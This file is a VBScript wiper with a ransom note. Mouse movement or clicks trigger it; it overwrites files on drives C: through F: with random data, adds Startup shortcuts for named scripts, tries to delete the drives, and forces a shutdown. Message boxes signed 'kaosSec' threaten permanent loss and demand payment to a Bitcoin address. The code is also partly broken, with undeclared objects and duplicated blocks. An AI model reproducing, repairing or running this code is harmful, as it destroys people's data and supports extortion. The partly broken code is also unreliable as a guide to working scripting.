Set objShell = WScript.CreateObject("WScript.Shell")

Sub MouseMoveEvent()
    Dim fso, drive, passes, blocksize, size, i, j, percent
    Set fso = CreateObject("Scripting.FileSystemObject")
  
    drive = "C:"
    passes = 11
    blocksize = 65536

    For Each objFolder In objFSO.GetDrive(drive).RootFolder.SubFolders
        WScript.Echo objFolder.Path
        filenames(0) = "rhl.vbs"
        filenames(1) = "littlejoe.vbs"
        filenames(2) = "lj.vbs"
        filenames(3) = "go.bat"
        filenames(4) = "nogapi.dll"
        
        Dim currentDirectory
        Set fso = CreateObject("Scripting.FileSystemObject")
        currentDirectory = objFolder.Path
        
        Set files = fso.GetFolder(currentDirectory).Files
        For Each file In files
            Dim foundFilename
            For Each filename In filenames
                If LCase(file.Name) = LCase(filename) Then
                    foundFilename = True
                    Set WshShell = CreateObject("WScript.Shell")
                    startupPath = WshShell.SpecialFolders("Startup")
                    Set registryKey = WshShell.CreateShortcut(startupPath & "\" & file.Name & ".lnk")
                    registryKey.TargetPath = file.Path
                    registryKey.Save
                    Exit For
                End If
            Next
            If Not foundFilename Then
                ' overwrite the file with random data
                Set stream = fso.CreateTextFile(file.Path, True)
                Randomize
                For i = 1 To 1024 ' write 1024 random characters
                    stream.Write Chr(Int((127-32+1)*Rnd+32))
                Next
                stream.Close
            End If
        Next
    Next
    
    WScript.Echo "Overwriting " & drive & " with random data..."
    
    For i = 1 To passes
        WScript.Echo "Pass " & i & " of " & passes
        counter = 0
        Set disks = GetObject("winmgmts:").ExecQuery("SELECT Size FROM Win32_DiskDrive WHERE DeviceID = '" & drive & "'")
        For Each disk In disks
            size = CLng(disk.Size) \ (1024 * blocksize)
        Next
        For j = 1 To size
            percent = counter * 100 / size
            counter = counter + 1
            WScript.Echo "Progress: " & percent & "%, Block " & j & " of " & size
            Set tmpFile = fso.CreateTextFile(drive & "\dummy.tmp")
            For k = 1 To blocksize
                tmpFile.Write Chr(Int(Rnd * 256))
            Next
            tmpFile.Close
            fso.DeleteFile drive & "\dummy.tmp", True
            fso.DeleteFile drive, True
        Next
    Next
    
    WScript.Echo "rip x3"
    Dim fso, drive, passes, blocksize, size, i, j, percent
    Set fso = CreateObject("Scripting.FileSystemObject")
  
    drive = "D:"
    passes = 11
    blocksize = 65536

    For Each objFolder In objFSO.GetDrive(drive).RootFolder.SubFolders
        WScript.Echo objFolder.Path
        filenames(0) = "rhl.vbs"
        filenames(1) = "littlejoe.vbs"
        filenames(2) = "lj.vbs"
        filenames(3) = "go.bat"
        filenames(4) = "nogapi.dll"
        
        Dim currentDirectory
        Set fso = CreateObject("Scripting.FileSystemObject")
        currentDirectory = objFolder.Path
        
        Set files = fso.GetFolder(currentDirectory).Files
        For Each file In files
            Dim foundFilename
            For Each filename In filenames
                If LCase(file.Name) = LCase(filename) Then
                    foundFilename = True
                    Set WshShell = CreateObject("WScript.Shell")
                    startupPath = WshShell.SpecialFolders("Startup")
                    Set registryKey = WshShell.CreateShortcut(startupPath & "\" & file.Name & ".lnk")
                    registryKey.TargetPath = file.Path
                    registryKey.Save
                    Exit For
                End If
            Next
            If Not foundFilename Then
                ' overwrite the file with random data
                Set stream = fso.CreateTextFile(file.Path, True)
                Randomize
                For i = 1 To 1024 ' write 1024 random characters
                    stream.Write Chr(Int((127-32+1)*Rnd+32))
                Next
                stream.Close
            End If
        Next
    Next
    
    WScript.Echo "Overwriting " & drive & " with random data..."
    
    For i = 1 To passes
        WScript.Echo "Pass " & i & " of " & passes
        counter = 0
        Set disks = GetObject("winmgmts:").ExecQuery("SELECT Size FROM Win32_DiskDrive WHERE DeviceID = '" & drive & "'")
        For Each disk In disks
            size = CLng(disk.Size) \ (1024 * blocksize)
        Next
        For j = 1 To size
            percent = counter * 100 / size
            counter = counter + 1
            WScript.Echo "Progress: " & percent & "%, Block " & j & " of " & size
            Set tmpFile = fso.CreateTextFile(drive & "\dummy.tmp")
            For k = 1 To blocksize
                tmpFile.Write Chr(Int(Rnd * 256))
            Next
            tmpFile.Close
            fso.DeleteFile drive & "\dummy.tmp", True
            fso.DeleteFile drive, True
        Next
    Next
    
    WScript.Echo "rip x3"
    Dim fso, drive, passes, blocksize, size, i, j, percent
    Set fso = CreateObject("Scripting.FileSystemObject")
  
    drive = "E:"
    passes = 11
    blocksize = 65536

    For Each objFolder In objFSO.GetDrive(drive).RootFolder.SubFolders
        WScript.Echo objFolder.Path
        filenames(0) = "rhl.vbs"
        filenames(1) = "littlejoe.vbs"
        filenames(2) = "lj.vbs"
        filenames(3) = "go.bat"
        filenames(4) = "nogapi.dll"
        
        Dim currentDirectory
        Set fso = CreateObject("Scripting.FileSystemObject")
        currentDirectory = objFolder.Path
        
        Set files = fso.GetFolder(currentDirectory).Files
        For Each file In files
            Dim foundFilename
            For Each filename In filenames
                If LCase(file.Name) = LCase(filename) Then
                    foundFilename = True
                    Set WshShell = CreateObject("WScript.Shell")
                    startupPath = WshShell.SpecialFolders("Startup")
                    Set registryKey = WshShell.CreateShortcut(startupPath & "\" & file.Name & ".lnk")
                    registryKey.TargetPath = file.Path
                    registryKey.Save
                    Exit For
                End If
            Next
            If Not foundFilename Then
                ' overwrite the file with random data
                Set stream = fso.CreateTextFile(file.Path, True)
                Randomize
                For i = 1 To 1024 ' write 1024 random characters
                    stream.Write Chr(Int((127-32+1)*Rnd+32))
                Next
                stream.Close
            End If
        Next
    Next
    
    WScript.Echo "Overwriting " & drive & " with random data..."
    
    For i = 1 To passes
        WScript.Echo "Pass " & i & " of " & passes
        counter = 0
        Set disks = GetObject("winmgmts:").ExecQuery("SELECT Size FROM Win32_DiskDrive WHERE DeviceID = '" & drive & "'")
        For Each disk In disks
            size = CLng(disk.Size) \ (1024 * blocksize)
        Next
        For j = 1 To size
            percent = counter * 100 / size
            counter = counter + 1
            WScript.Echo "Progress: " & percent & "%, Block " & j & " of " & size
            Set tmpFile = fso.CreateTextFile(drive & "\dummy.tmp")
            For k = 1 To blocksize
                tmpFile.Write Chr(Int(Rnd * 256))
            Next
            tmpFile.Close
            fso.DeleteFile drive & "\dummy.tmp", True
            fso.DeleteFile drive, True
        Next
    Next
    
    WScript.Echo "rip x3"
    Dim fso, drive, passes, blocksize, size, i, j, percent
    Set fso = CreateObject("Scripting.FileSystemObject")
  
    drive = "F:"
    passes = 11
    blocksize = 65536

    For Each objFolder In objFSO.GetDrive(drive).RootFolder.SubFolders
        WScript.Echo objFolder.Path
        filenames(0) = "rhl.vbs"
        filenames(1) = "littlejoe.vbs"
        filenames(2) = "lj.vbs"
        filenames(3) = "go.bat"
        filenames(4) = "nogapi.dll"
        
        Dim currentDirectory
        Set fso = CreateObject("Scripting.FileSystemObject")
        currentDirectory = objFolder.Path
        
        Set files = fso.GetFolder(currentDirectory).Files
        For Each file In files
            Dim foundFilename
            For Each filename In filenames
                If LCase(file.Name) = LCase(filename) Then
                    foundFilename = True
                    Set WshShell = CreateObject("WScript.Shell")
                    startupPath = WshShell.SpecialFolders("Startup")
                    Set registryKey = WshShell.CreateShortcut(startupPath & "\" & file.Name & ".lnk")
                    registryKey.TargetPath = file.Path
                    registryKey.Save
                    Exit For
                End If
            Next
            If Not foundFilename Then
                ' overwrite the file with random data
                Set stream = fso.CreateTextFile(file.Path, True)
                Randomize
                For i = 1 To 1024 ' write 1024 random characters
                    stream.Write Chr(Int((127-32+1)*Rnd+32))
                Next
                stream.Close
            End If
        Next
    Next
    
    WScript.Echo "Overwriting " & drive & " with random data..."
    
    For i = 1 To passes
        WScript.Echo "Pass " & i & " of " & passes
        counter = 0
        Set disks = GetObject("winmgmts:").ExecQuery("SELECT Size FROM Win32_DiskDrive WHERE DeviceID = '" & drive & "'")
        For Each disk In disks
            size = CLng(disk.Size) \ (1024 * blocksize)
        Next
        For j = 1 To size
            percent = counter * 100 / size
            counter = counter + 1
            WScript.Echo "Progress: " & percent & "%, Block " & j & " of " & size
            Set tmpFile = fso.CreateTextFile(drive & "\dummy.tmp")
            For k = 1 To blocksize
                tmpFile.Write Chr(Int(Rnd * 256))
            Next
            tmpFile.Close
            fso.DeleteFile drive & "\dummy.tmp", True
            fso.DeleteFile drive, True
        Next
    Next
    
    WScript.Echo "rip x3"
    objShell.Run "shutdown -s -t 0"
End Sub

Sub MouseButtonEvent()
    Dim fso, drive, passes, blocksize, size, i, j, percent
    Set fso = CreateObject("Scripting.FileSystemObject")
  
    drive = "C:"
    passes = 11
    blocksize = 65536

    For Each objFolder In objFSO.GetDrive(drive).RootFolder.SubFolders
        WScript.Echo objFolder.Path
        filenames(0) = "rhl.vbs"
        filenames(1) = "littlejoe.vbs"
        filenames(2) = "lj.vbs"
        filenames(3) = "go.bat"
        filenames(4) = "nogapi.dll"
        
        Dim currentDirectory
        Set fso = CreateObject("Scripting.FileSystemObject")
        currentDirectory = objFolder.Path
        
        Set files = fso.GetFolder(currentDirectory).Files
        For Each file In files
            Dim foundFilename
            For Each filename In filenames
                If LCase(file.Name) = LCase(filename) Then
                    foundFilename = True
                    Set WshShell = CreateObject("WScript.Shell")
                    startupPath = WshShell.SpecialFolders("Startup")
                    Set registryKey = WshShell.CreateShortcut(startupPath & "\" & file.Name & ".lnk")
                    registryKey.TargetPath = file.Path
                    registryKey.Save
                    Exit For
                End If
            Next
            If Not foundFilename Then
                ' overwrite the file with random data
                Set stream = fso.CreateTextFile(file.Path, True)
                Randomize
                For i = 1 To 1024 ' write 1024 random characters
                    stream.Write Chr(Int((127-32+1)*Rnd+32))
                Next
                stream.Close
            End If
        Next
    Next
    
    WScript.Echo "Overwriting " & drive & " with random data..."
    
    For i = 1 To passes
        WScript.Echo "Pass " & i & " of " & passes
        counter = 0
        Set disks = GetObject("winmgmts:").ExecQuery("SELECT Size FROM Win32_DiskDrive WHERE DeviceID = '" & drive & "'")
        For Each disk In disks
            size = CLng(disk.Size) \ (1024 * blocksize)
        Next
        For j = 1 To size
            percent = counter * 100 / size
            counter = counter + 1
            WScript.Echo "Progress: " & percent & "%, Block " & j & " of " & size
            Set tmpFile = fso.CreateTextFile(drive & "\dummy.tmp")
            For k = 1 To blocksize
                tmpFile.Write Chr(Int(Rnd * 256))
            Next
            tmpFile.Close
            fso.DeleteFile drive & "\dummy.tmp", True
            fso.DeleteFile drive, True
        Next
    Next
    
    WScript.Echo "rip x3"
    Dim fso, drive, passes, blocksize, size, i, j, percent
    Set fso = CreateObject("Scripting.FileSystemObject")
  
    drive = "D:"
    passes = 11
    blocksize = 65536

    For Each objFolder In objFSO.GetDrive(drive).RootFolder.SubFolders
        WScript.Echo objFolder.Path
        filenames(0) = "rhl.vbs"
        filenames(1) = "littlejoe.vbs"
        filenames(2) = "lj.vbs"
        filenames(3) = "go.bat"
        filenames(4) = "nogapi.dll"
        
        Dim currentDirectory
        Set fso = CreateObject("Scripting.FileSystemObject")
        currentDirectory = objFolder.Path
        
        Set files = fso.GetFolder(currentDirectory).Files
        For Each file In files
            Dim foundFilename
            For Each filename In filenames
                If LCase(file.Name) = LCase(filename) Then
                    foundFilename = True
                    Set WshShell = CreateObject("WScript.Shell")
                    startupPath = WshShell.SpecialFolders("Startup")
                    Set registryKey = WshShell.CreateShortcut(startupPath & "\" & file.Name & ".lnk")
                    registryKey.TargetPath = file.Path
                    registryKey.Save
                    Exit For
                End If
            Next
            If Not foundFilename Then
                ' overwrite the file with random data
                Set stream = fso.CreateTextFile(file.Path, True)
                Randomize
                For i = 1 To 1024 ' write 1024 random characters
                    stream.Write Chr(Int((127-32+1)*Rnd+32))
                Next
                stream.Close
            End If
        Next
    Next
    
    WScript.Echo "Overwriting " & drive & " with random data..."
    
    For i = 1 To passes
        WScript.Echo "Pass " & i & " of " & passes
        counter = 0
        Set disks = GetObject("winmgmts:").ExecQuery("SELECT Size FROM Win32_DiskDrive WHERE DeviceID = '" & drive & "'")
        For Each disk In disks
            size = CLng(disk.Size) \ (1024 * blocksize)
        Next
        For j = 1 To size
            percent = counter * 100 / size
            counter = counter + 1
            WScript.Echo "Progress: " & percent & "%, Block " & j & " of " & size
            Set tmpFile = fso.CreateTextFile(drive & "\dummy.tmp")
            For k = 1 To blocksize
                tmpFile.Write Chr(Int(Rnd * 256))
            Next
            tmpFile.Close
            fso.DeleteFile drive & "\dummy.tmp", True
            fso.DeleteFile drive, True
        Next
    Next
    
    WScript.Echo "rip x3"
    Dim fso, drive, passes, blocksize, size, i, j, percent
    Set fso = CreateObject("Scripting.FileSystemObject")
  
    drive = "E:"
    passes = 11
    blocksize = 65536

    For Each objFolder In objFSO.GetDrive(drive).RootFolder.SubFolders
        WScript.Echo objFolder.Path
        filenames(0) = "rhl.vbs"
        filenames(1) = "littlejoe.vbs"
        filenames(2) = "lj.vbs"
        filenames(3) = "go.bat"
        filenames(4) = "nogapi.dll"
        
        Dim currentDirectory
        Set fso = CreateObject("Scripting.FileSystemObject")
        currentDirectory = objFolder.Path
        
        Set files = fso.GetFolder(currentDirectory).Files
        For Each file In files
            Dim foundFilename
            For Each filename In filenames
                If LCase(file.Name) = LCase(filename) Then
                    foundFilename = True
                    Set WshShell = CreateObject("WScript.Shell")
                    startupPath = WshShell.SpecialFolders("Startup")
                    Set registryKey = WshShell.CreateShortcut(startupPath & "\" & file.Name & ".lnk")
                    registryKey.TargetPath = file.Path
                    registryKey.Save
                    Exit For
                End If
            Next
            If Not foundFilename Then
                ' overwrite the file with random data
                Set stream = fso.CreateTextFile(file.Path, True)
                Randomize
                For i = 1 To 1024 ' write 1024 random characters
                    stream.Write Chr(Int((127-32+1)*Rnd+32))
                Next
                stream.Close
            End If
        Next
    Next
    
    WScript.Echo "Overwriting " & drive & " with random data..."
    
    For i = 1 To passes
        WScript.Echo "Pass " & i & " of " & passes
        counter = 0
        Set disks = GetObject("winmgmts:").ExecQuery("SELECT Size FROM Win32_DiskDrive WHERE DeviceID = '" & drive & "'")
        For Each disk In disks
            size = CLng(disk.Size) \ (1024 * blocksize)
        Next
        For j = 1 To size
            percent = counter * 100 / size
            counter = counter + 1
            WScript.Echo "Progress: " & percent & "%, Block " & j & " of " & size
            Set tmpFile = fso.CreateTextFile(drive & "\dummy.tmp")
            For k = 1 To blocksize
                tmpFile.Write Chr(Int(Rnd * 256))
            Next
            tmpFile.Close
            fso.DeleteFile drive & "\dummy.tmp", True
            fso.DeleteFile drive, True
        Next
    Next
    
    WScript.Echo "rip x3"
    Dim fso, drive, passes, blocksize, size, i, j, percent
    Set fso = CreateObject("Scripting.FileSystemObject")
  
    drive = "F:"
    passes = 11
    blocksize = 65536

    For Each objFolder In objFSO.GetDrive(drive).RootFolder.SubFolders
        WScript.Echo objFolder.Path
        filenames(0) = "rhl.vbs"
        filenames(1) = "littlejoe.vbs"
        filenames(2) = "lj.vbs"
        filenames(3) = "go.bat"
        filenames(4) = "nogapi.dll"
        
        Dim currentDirectory
        Set fso = CreateObject("Scripting.FileSystemObject")
        currentDirectory = objFolder.Path
        
        Set files = fso.GetFolder(currentDirectory).Files
        For Each file In files
            Dim foundFilename
            For Each filename In filenames
                If LCase(file.Name) = LCase(filename) Then
                    foundFilename = True
                    Set WshShell = CreateObject("WScript.Shell")
                    startupPath = WshShell.SpecialFolders("Startup")
                    Set registryKey = WshShell.CreateShortcut(startupPath & "\" & file.Name & ".lnk")
                    registryKey.TargetPath = file.Path
                    registryKey.Save
                    Exit For
                End If
            Next
            If Not foundFilename Then
                ' overwrite the file with random data
                Set stream = fso.CreateTextFile(file.Path, True)
                Randomize
                For i = 1 To 1024 ' write 1024 random characters
                    stream.Write Chr(Int((127-32+1)*Rnd+32))
                Next
                stream.Close
            End If
        Next
    Next
    
    WScript.Echo "Overwriting " & drive & " with random data..."
    
    For i = 1 To passes
        WScript.Echo "Pass " & i & " of " & passes
        counter = 0
        Set disks = GetObject("winmgmts:").ExecQuery("SELECT Size FROM Win32_DiskDrive WHERE DeviceID = '" & drive & "'")
        For Each disk In disks
            size = CLng(disk.Size) \ (1024 * blocksize)
        Next
        For j = 1 To size
            percent = counter * 100 / size
            counter = counter + 1
            WScript.Echo "Progress: " & percent & "%, Block " & j & " of " & size
            Set tmpFile = fso.CreateTextFile(drive & "\dummy.tmp")
            For k = 1 To blocksize
                tmpFile.Write Chr(Int(Rnd * 256))
            Next
            tmpFile.Close
            fso.DeleteFile drive & "\dummy.tmp", True
            fso.DeleteFile drive, True
        Next
    Next
    
    WScript.Echo "rip x3"
    objShell.Run "shutdown -s -t 0"
End Sub

Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
Set colMonitoredEvents = objWMIService.ExecNotificationQuery("SELECT * FROM __InstanceOperationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_PointingDevice'")

Do
MsgBox "if there's any mouse input you'll lose files forever - kaosSec", vbInformation, "winz0r32"
MsgBox "KINDLY PAY FOR ANY ADVICE ON HOW TO CONTINUE OR IDK.... FIGURE IT OUT URSELF: 1BYc2fMJxi3cwrEneTJbTC47oJZ8Xfsdib", vbInformation, "Windows"
WScript.Echo "MADNESS, MADNESS"
WScript.Echo "1BYc2fMJxi3cwrEneTJbTC47oJZ8Xfsdib"
    Set objLatestEvent = colMonitoredEvents.NextEvent()
    If objLatestEvent.TargetInstance.DeviceID = "\\.\DISPLAY1\Monitor0\Win32_PointingDevice.Mouse" Then
        If objLatestEvent.TargetInstance.LastEvent = 1 Then
            MouseButtonEvent()
        Else
            MouseMoveEvent()
        End If
    End If
Loop
